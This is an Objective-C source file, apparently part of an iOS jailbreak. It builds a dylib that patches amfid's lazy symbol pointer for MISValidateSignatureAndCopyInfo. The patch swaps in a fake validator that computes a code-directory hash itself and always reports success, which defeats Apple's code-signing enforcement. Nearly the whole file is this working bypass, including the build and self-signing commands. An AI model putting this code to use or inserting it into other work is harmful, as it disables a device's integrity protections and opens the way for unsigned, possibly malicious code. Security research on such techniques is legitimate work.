// xcrun -sdk iphoneos gcc -dynamiclib -arch arm64 -framework Foundation -o amfid_payload.dylib amfid_payload.m
// jtool --sign --inplace amfid_payload.dylib

#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <spawn.h>
#include <sys/stat.h>
#include <pthread.h>

#import <Foundation/Foundation.h>
#include <CommonCrypto/CommonDigest.h>

kern_return_t mach_vm_allocate
(
 vm_map_t target,
 mach_vm_address_t *address,
 mach_vm_size_t size,
 int flags
 );

kern_return_t mach_vm_write
(
 vm_map_t target_task,
 mach_vm_address_t address,
 vm_offset_t data,
 mach_msg_type_number_t dataCnt
 );

 extern kern_return_t mach_vm_deallocate
(
 vm_map_t target,
 mach_vm_address_t address,
 mach_vm_size_t size
);


kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_region(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t *size, vm_region_flavor_t flavor, vm_region_info_t info, mach_msg_type_number_t *infoCnt, mach_port_t *object_name);

size_t remote_read(uint64_t where, void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(mach_task_self(), where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            printf("[fun_utils] error on remote_read(0x%016llx)\n", (offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

uint64_t remote_read64(uint64_t where) {
    uint64_t out;
    remote_read(where, &out, sizeof(uint64_t));
    return out;
}

void
remote_read_overwrite(mach_port_t task_port,
                      uint64_t remote_address,
                      uint64_t local_address,
                      uint64_t length)
{
  kern_return_t err;

  mach_vm_size_t outsize = 0;
  err = mach_vm_read_overwrite(task_port, (mach_vm_address_t)remote_address, (mach_vm_size_t)length, (mach_vm_address_t)local_address, &outsize);
  if (err != KERN_SUCCESS){
    NSLog(@"remote read failed\n");
    return;
  }

  if (outsize != length){
    NSLog(@"remote read was short (expected %llx, got %llx\n", length, outsize);
    return;
  }
}

void
remote_write(mach_port_t remote_task_port,
             uint64_t remote_address,
             uint64_t local_address,
             uint64_t length)
{
  kern_return_t err = mach_vm_write(remote_task_port,
                                    (mach_vm_address_t)remote_address,
                                    (vm_offset_t)local_address,
                                    (mach_msg_type_number_t)length);
  if (err != KERN_SUCCESS) {
    NSLog(@"remote write failed: %s %x\n", mach_error_string(err), err);
    return;
  }
}

uint64_t binary_load_address() {
  kern_return_t err;
  mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
  memory_object_name_t object_name = MACH_PORT_NULL; /* unused */
  mach_vm_size_t target_first_size = 0x1000;
  mach_vm_address_t target_first_addr = 0x0;
  struct vm_region_basic_info_64 region = {0};
  err = mach_vm_region(mach_task_self(), &target_first_addr, &target_first_size, VM_REGION_BASIC_INFO_64, (vm_region_info_t)&region, &region_count, &object_name);

  if (err != KERN_SUCCESS) {
    printf("failed to get the region\n");
    return -1;
  }

  return target_first_addr;
}


uint32_t swap_uint32(uint32_t val) {
	val = ((val << 8) & 0xFF00FF00 ) | ((val >> 8) & 0xFF00FF );
	return (val << 16) | (val >> 16);
}


// see ldid.cpp around line 1250
uint8_t *get_hash(uint8_t* code_dir, uint32_t* size) {
    uint32_t* code_dir_int = (uint32_t*)code_dir;

    int cd_off = 0;
    while (code_dir_int[cd_off] != 0) {
        cd_off += 1;
    }
    cd_off += 1;
    int actual_off = swap_uint32(code_dir_int[cd_off]);

    code_dir_int = (uint32_t*)(code_dir+actual_off);
    uint32_t realsize = swap_uint32(code_dir_int[1]);

    if (swap_uint32(code_dir_int[0]) != 0xfade0c02) {
        NSLog(@"[get_hash] wtf, not CSMAGIC_CODEDIRECTORY?!");
        return NULL;
    }

    uint32_t cd_version = swap_uint32(code_dir_int[2]);
    if (cd_version != 0x00020001) {
        NSLog(@"[get_hash] Unknown version of codedir: %x", cd_version);
        return NULL;
    }

    // 2 uint32s in Blob (magic, length)
    // 7 uint32s in CodeDirectory (version, flags, ..., codeLimit)
    // 1 uint8 (hashSize)
    uint8_t hash_type = ((uint8_t*)code_dir_int)[9*4 + 1];

    // uint32_t realsize = 0;
    // for (int j = 0; j < 1000; j++) {
    //     if (swap_uint32(code_dir_int[j]) == 0xfade0c02) {
    //         realsize = swap_uint32(code_dir_int[j+1]);
    //         code_dir += 4*j;
    //     }
    // }

    uint8_t *out = NULL;
    if (hash_type == 1) {
        *size = CC_SHA1_DIGEST_LENGTH;
        out = malloc(*size);
        CC_SHA1(code_dir_int, realsize, out);
    } else if (hash_type == 2) {
        *size = CC_SHA256_DIGEST_LENGTH;
        out = malloc(*size);
        CC_SHA256(code_dir_int, realsize, out);
    } else {
        NSLog(@"[get_hash] Unknown hash type: 0x%x", hash_type);
        out = NULL;
    }

    return out;
}

uint8_t *get_code_directory(const char* name, uint64_t file_off) {
	// Assuming it is a macho

	FILE* fd = fopen(name, "r");

    if (fd == NULL) {
        NSLog(@"Couldn't open file");
        return NULL;
    }

    uint64_t off = file_off;
    fseek(fd, off, SEEK_SET);

	struct mach_header_64 mh;
	fread(&mh, sizeof(struct mach_header_64), 1, fd);

	off += sizeof(struct mach_header_64);
	for (int i = 0; i < mh.ncmds; i++) {
		const struct load_command cmd;
		fseek(fd, off, SEEK_SET);
		fread((void*)&cmd, sizeof(struct load_command), 1, fd);
		if (cmd.cmd == 0x1d) {
			uint32_t off_cs;
			fread(&off_cs, sizeof(uint32_t), 1, fd);
			uint32_t size_cs;
			fread(&size_cs, sizeof(uint32_t), 1, fd);

			uint8_t *cd = malloc(size_cs);
			fseek(fd, off_cs+file_off, SEEK_SET);
			fread(cd, size_cs, 1, fd);
			return cd;
		} else {
			off += cmd.cmdsize;
		}
	}
    NSLog(@"Didnt find the code signature");
	return NULL;
}

uint64_t real_func = 0;

typedef int (*t)(NSString* file, NSDictionary* options, NSMutableDictionary** info);

int fake_MISValidateSignatureAndCopyInfo(NSString* file, NSDictionary* options, NSMutableDictionary** info) {
    // NSString *file = (__bridge NSString *)fileStr;
    // NSDictionary *options = (__bridge NSDictionary*)opts;
    NSLog(@"We got called! %@ with %@ (info: %@)", file, options, *info);

    t actual_func = (t)real_func;
    int origret = actual_func(file, options, info);
    NSLog(@"We got called! AFTER ACTUAL %@ with %@ (info: %@)", file, options, *info);

    if (![*info objectForKey:@"CdHash"]) {
        NSNumber* file_offset = [options objectForKey:@"UniversalFileOffset"];
        uint64_t file_off = [file_offset unsignedLongLongValue];

        uint8_t* code_directory = get_code_directory([file UTF8String], file_off);
        if (!code_directory)
            return origret;

        uint32_t size;
        uint8_t* cd_hash = get_hash(code_directory, &size);

        if (!cd_hash)
            return origret;

        *info = [[NSMutableDictionary alloc] init];
        [*info setValue:[[NSData alloc] initWithBytes:cd_hash length:size] forKey:@"CdHash"];
        NSLog(@"ours: %@", *info);
    }

    return 0;
}



void* thd_func(void* arg){
    NSLog(@"In a new thread!");
    NSLog(@"Base at %016llx", binary_load_address());
    if (binary_load_address() == -1) {
        return NULL;
    }

    /* Finding the location of MISValidateSignatureAndCopyInfo from Ian Beer's triple_fetch */
    void* libmis_handle = dlopen("libmis.dylib", RTLD_NOW);
    if (libmis_handle == NULL){
        NSLog(@"Failed to open the dylib!");
        return NULL;
    }

    void* sym = dlsym(libmis_handle, "MISValidateSignatureAndCopyInfo");
    if (sym == NULL){
        NSLog(@"unable to resolve MISValidateSignatureAndCopyInfo\n");
        return NULL;
    }

    uint64_t buf_size = 0x8000;
    uint8_t* buf = malloc(buf_size);

    remote_read_overwrite(mach_task_self(), binary_load_address(), (uint64_t)buf, buf_size);
    uint8_t* found_at = memmem(buf, buf_size, &sym, sizeof(sym));
    if (found_at == NULL){
        NSLog(@"unable to find MISValidateSignatureAndCopyInfo in __la_symbol_ptr\n");
        return NULL;
    }

    uint64_t patch_offset = found_at - buf;

    uint64_t fake_func_addr = (uint64_t)&fake_MISValidateSignatureAndCopyInfo;

    real_func = remote_read64(binary_load_address()+patch_offset);

    // Replace it with our version
    remote_write(mach_task_self(), binary_load_address()+patch_offset, (uint64_t)&fake_func_addr, 8);
    return NULL;
}

__attribute__ ((constructor))
static void ctor(void) {
	NSLog(@"Hi there - creating the thread to do our stuff!");
    pthread_t thd;
    pthread_create(&thd, NULL, thd_func, NULL);
}
